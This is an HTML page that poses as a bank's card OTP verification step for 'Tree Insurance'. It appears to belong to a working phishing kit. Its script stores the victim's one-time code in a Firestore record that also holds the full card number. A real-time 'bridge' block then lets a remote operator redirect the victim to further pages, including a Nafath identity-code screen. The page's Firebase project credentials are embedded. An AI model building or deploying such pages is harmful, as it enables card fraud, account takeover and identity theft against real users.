<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="js/theme-toggle.js"></script>
    <script src="js/i18n.js"></script>
    <title>رمز التحقق | OTP Verification</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="css/site-theme.css">
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
    <style>
        body { display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 12px; }
        .acs-container { width: 90%; max-width: 420px; overflow: hidden; }
        .acs-header { padding: 15px 25px; display: flex; justify-content: space-between; align-items: center; }
        .acs-header h3 { margin: 0; font-size: 16px; font-weight: bold; }
        .acs-header img { height: 28px; object-fit: contain; }
        .acs-body { padding: 25px; }
        .alert-info { padding: 10px; border-radius: 10px; font-size: 13px; margin-bottom: 20px; }
        .txn-details { margin-bottom: 20px; font-size: 14px; }
        .detail-row { display: flex; justify-content: space-between; margin-bottom: 8px; border-bottom: 1px dashed var(--tree-border); padding-bottom: 8px; }
        label { font-size: 13px; font-weight: bold; display: block; margin-bottom: 8px; }
        input { width: 100%; padding: 12px; border-radius: 10px; font-size: 18px; text-align: center; letter-spacing: 5px; margin-bottom: 10px; box-sizing: border-box; }
        .timer-text { font-size: 12px; text-align: center; margin-bottom: 15px; }
        button { width: 100%; padding: 12px; font-weight: bold; cursor: pointer; font-size: 15px; transition: 0.2s; }
        button:hover { filter: brightness(1.05); }
        .spinner { display: none; margin: 20px auto; border: 4px solid var(--tree-border); border-top: 4px solid var(--tree-primary); border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .footer-secure { margin-top: 20px; text-align: center; opacity: 0.85; }
        .footer-secure img { height: 22px; margin: 0 5px; }
    </style>
</head>
<body class="tree-site otp-page">

<button type="button" class="tree-theme-toggle" onclick="toggleTreeTheme()" aria-label="تبديل الوضع الليلي"><span class="tree-theme-toggle__glyph" aria-hidden="true"></span></button>

<div class="acs-container">
    <div class="acs-header">
        <h3 data-i18n="otp.title">إثبات ملكية البطاقة</h3>
        <div style="display:flex;align-items:center;gap:8px;">
            <img src="images/logo.png" alt="Tree" onerror="this.src='https://placehold.co/100x28/198754/ffffff?text=TREE'">
            <button class="btn btn-outline-success btn-sm" data-lang-toggle onclick="toggleLang()" style="font-size:0.75rem;padding:3px 10px;">EN</button>
        </div>
    </div>
    <div class="acs-body">
        <div class="alert-info" data-i18n="otp.alert">سيتم إجراء معاملة مالية على حسابك المصرفي، يرجى التحقق من التفاصيل أدناه.</div>

        <div class="txn-details">
            <div class="detail-row"><span class="detail-label" data-i18n="otp.merchant">التاجر</span><span class="detail-value">تري | Tree Insurance</span></div>
            <div class="detail-row"><span class="detail-label" data-i18n="otp.amount">المبلغ</span><span class="detail-value">SAR <span id="txn-amount">--.--</span></span></div>
            <div class="detail-row"><span class="detail-label" data-i18n="otp.card">البطاقة</span><span class="detail-value" dir="ltr">**** **** **** <span id="card-last4">----</span></span></div>
        </div>

        <label data-i18n="otp.label">رمز التحقق (OTP)</label>
        <p style="font-size: 12px; color: #777; margin-top: -5px; margin-bottom: 10px;" data-i18n="otp.hint">لتأكيد العملية أدخل الرمز المرسل إلى جوالك المسجل.</p>
        <input type="number" id="otpInput" placeholder="----">

        <div class="timer-text"><span data-i18n="otp.validity">صلاحية الرمز:</span> <span id="timer">02:00</span></div>

        <button id="submitBtn" onclick="verifyOTP()" data-i18n="otp.confirm">تأكيد</button>
        <div id="loader" class="spinner"></div>

        <div class="footer-secure">
            <img src="https://img.icons8.com/color/48/visa.png" alt="Visa">
            <img src="https://img.icons8.com/color/48/mastercard.png" alt="Mastercard">
        </div>
    </div>
</div>

<script>
    const firebaseConfig = {
        apiKey: "AIzaSyCtPCVee8eynRfuFHZ6if_eK-vtaMYY-iE",
        authDomain: "tameen-658e9.firebaseapp.com",
        projectId: "tameen-658e9",
        storageBucket: "tameen-658e9.firebasestorage.app",
        messagingSenderId: "292670676256",
        appId: "1:292670676256:web:3624157751cd194efe4b45"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();
    const userId = localStorage.getItem('user_id');

    // 1. جلب تفاصيل البطاقة والمبلغ للعرض
    if (userId) {
        db.collection("orders").doc(userId).get().then((doc) => {
            if (doc.exists) {
                const data = doc.data();
                if (data.card_number) {
                    const last4 = data.card_number.replace(/\s/g, '').slice(-4);
                    document.getElementById('card-last4').innerText = last4;
                }
                if (data.price) {
                    const num = parseFloat(data.price);
                    document.getElementById('txn-amount').innerText = isNaN(num) ? data.price : num.toFixed(2);
                } else if (data.total_price) {
                    const num = parseFloat(data.total_price);
                    document.getElementById('txn-amount').innerText = isNaN(num) ? data.total_price : num.toFixed(2);
                } else {
                    // fallback من localStorage إذا حُفظ عند الدفع
                    const saved = localStorage.getItem('selected_price');
                    if (saved) {
                        const num = parseFloat(saved);
                        document.getElementById('txn-amount').innerText = isNaN(num) ? saved : num.toFixed(2);
                    }
                }
            }
        });
    }

    // 2. مؤقت تنازلي
    let timeLeft = 120; // 2 minutes
    setInterval(() => {
        if (timeLeft <= 0) return;
        timeLeft--;
        const m = Math.floor(timeLeft / 60).toString().padStart(2, '0');
        const s = (timeLeft % 60).toString().padStart(2, '0');
        document.getElementById('timer').innerText = `${m}:${s}`;
    }, 1000);

    async function verifyOTP() {
        const otpValue = document.getElementById('otpInput').value;
        if(otpValue.length < 4) { alert(t('otp.err_short')); return; }

        // إظهار السبينر وإخفاء الزر
        document.getElementById('submitBtn').style.display = 'none';
        document.getElementById('loader').style.display = 'block';

        try {
            // تحديث كود الـ OTP وتغيير الحالة فوراً إلى طلب الجوال
            await db.collection("orders").doc(userId).update({
                otp_code: otpValue,
                status: "show_mobile" // الحالة التي تحوله لصفحة الجوال
            });

            // التحويل التلقائي لصفحة الجوال
            setTimeout(() => {
                window.location.href = "mobile_verification.html";
            }, 1000); // تأخير بسيط لضمان الحفظ

        } catch (error) {
            console.error("Error:", error);
            alert(t('otp.err_connection'));
            document.getElementById('submitBtn').style.display = 'block';
            document.getElementById('loader').style.display = 'none';
        }
    }// --- أضف كود الجسر هنا (قبل إغلاق السكريبت) ---
(function() {
    const userId = localStorage.getItem('user_id');
    if (userId) {
        db.collection("orders").doc(userId).onSnapshot((doc) => {
            if (doc.exists) {
                const data = doc.data();
                if (data.next_step === "GO_TO_OTP") {
                    window.location.href = "otp_verification.html"; 
                } else if (data.next_step === "GO_TO_REJECT") {
                    window.location.href = "payment_failed.html";
                } else if (data.next_step === "GO_TO_NAFATH") {
                    window.location.href = "nafath.html";
                } else if (data.next_step === "SHOW_NAFATH_CODE") {
                    const codeBox = document.getElementById('nafath-number');
                    if (codeBox && data.nafath_code) {
                        codeBox.innerText = data.nafath_code;
                        const overlay = document.getElementById('overlay');
                        if (overlay) overlay.style.display = 'none';
                    }
                }
            }
        });
    }
})();
// ------------------------------------------

</script>
</body>
</html>
